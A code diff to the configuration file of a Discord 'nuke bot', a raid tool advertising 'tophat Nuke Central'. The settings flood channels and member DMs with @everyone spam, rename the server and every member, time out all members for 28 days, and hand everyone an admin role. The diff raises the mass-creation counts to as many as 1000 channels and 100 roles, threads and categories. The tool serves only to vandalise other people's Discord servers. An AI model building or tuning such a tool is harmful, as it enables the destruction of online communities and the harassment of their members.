@@ -15,43 +15,43 @@ class Config:
     # ===== BOT SETTINGS =====
     TOKEN = "Your Token Here"  # Your bot token from Discord Developer Portal
     PREFIX = "!"  # The prefix to use before commands (e.g. !nuke), you can also delete the prefix if you don't want one
-    WHITELIST = [User IDS Here]  # List of user IDs who can use the bot commands
+    WHITELIST = [User IDs Here]  # List of user IDs who can use the bot commands
 
     # ===== MESSAGE SETTINGS =====
     SPAM_MESSAGE = "@everyone g̸͈̀é̶̠t̴̟̾ ̷͓͘n̷̢̓û̶̟k̴͍̊e̸̻̽d̶̖͂ ̸͉̉b̷̝̍y̸̦͊ ̵̽͜t̴̢̏ȯ̸̜p̵̘͌ḩ̴̛a̴̟̋t̵͕̀  Join [tophat Nuke Central](<https://discord.gg/qfKPkxC3x7>) to get your own nuker bot."  # The message that will be spammed in channels
-    SPAM_COUNT = 10  # How many times to send the spam message in each channel
+    SPAM_COUNT = 1  # How many times to send the spam message in each channel
     TEXT_TO_SPEECH = False  # If true, messages will be read aloud by Discord's text-to-speech
     DM_MESSAGE = "n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚  Join [tophat Nuke Central](<https://discord.gg/qfKPkxC3x7>) to get your own nuker bot. "  # Message sent to all members via direct message
 
     # ===== CHANNEL SETTINGS =====
-    CHANNEL_NAME = "n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Base name for created text channels
-    CHANNELS_COUNT = 10  # How many text channels to create
-    NEW_CHANNEL_NAME = "n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Name pattern when renaming existing channels
-    VOICE_CHANNELS_COUNT = 10  # How many voice channels to create
-    VOICE_CHANNEL_NAME = "n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Base name for created voice channels
-    CATEGORY_NAME = "n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Base name for created categories
-    CATEGORIES_COUNT = 5  # How many categories to create
-    THREAD_COUNT = 5  # How many threads to create in each text channel
-    THREAD_NAME = "n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Base name for created threads
-    NSFW_CHANNEL_NAME = "n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Base name for NSFW channels
+    CHANNEL_NAME = "『😂』n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Base name for created text channels
+    CHANNELS_COUNT = 1000 # How many text channels to create
+    NEW_CHANNEL_NAME = "『😂』n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Name pattern when renaming existing channels
+    VOICE_CHANNELS_COUNT = 100  # How many voice channels to create
+    VOICE_CHANNEL_NAME = "『😂』n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Base name for created voice channels
+    CATEGORY_NAME = "『😂』n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Base name for created categories
+    CATEGORIES_COUNT = 100  # How many categories to create
+    THREAD_COUNT = 100  # How many threads to create in each text channel
+    THREAD_NAME = "『😂』n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Base name for created threads
+    NSFW_CHANNEL_NAME = "『😂』n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Base name for NSFW channels
     SLOWMODE_DURATION = 300  # Slowmode duration in seconds for all channels
 
     # ===== ROLE SETTINGS =====
-    ROLE_NAME = "n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Base name for created roles
-    ROLES_COUNT = 10  # How many roles to create
-    NEW_ROLE_NAME = "n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Name pattern when renaming existing roles
-    ADMIN_ROLE_NAME = "ADMIN"  # Name of the admin role given to everyone
+    ROLE_NAME = "😂n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Base name for created roles
+    ROLES_COUNT = 100  # How many roles to create
+    NEW_ROLE_NAME = "😂n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Name pattern when renaming existing roles
+    ADMIN_ROLE_NAME = "😂ADMIN GIFTED BY TOPHAT"  # Name of the admin role given to everyone
 
     # ===== SERVER SETTINGS =====
     SERVER_NAME = "n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚ "  # New name for the server
     SERVER_ICON_URL = "https://raw.githubusercontent.com/tophatgaming12345/Discord-Nuke-Bot/refs/heads/main/nuke.jfif"  # URL of new server icon
-    NICKNAME = "n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # New nickname for all members
+    NICKNAME = "😂n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # New nickname for all members
     TIMEOUT_DURATION = 28  # Timeout duration in days for all members, anything above 28 will not work
 
     # ===== WEBHOOK SETTINGS =====
-    WEBHOOK_NAME = "n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Base name for created webhooks
+    WEBHOOK_NAME = "😂n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Base name for created webhooks
     WEBHOOK_COUNT = 10  # How many webhooks to create per channel
-    WEBHOOK_RENAME = "n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Name pattern when renaming webhooks
+    WEBHOOK_RENAME = "😂n̷̦̈́u̵͎͊k̸̬̾e̶̦̒d̷̼̿ ̵͇̆b̴̙͌y̶̢͂ ̷͉̒t̸̺̑o̵̻̾p̸̡̚h̷̫̓a̵̼͑t̶̗̚"  # Name pattern when renaming webhooks
 
     # ===== INVITE SETTINGS =====
     INVITE_COUNT = 10  # How many invite links to create per channel
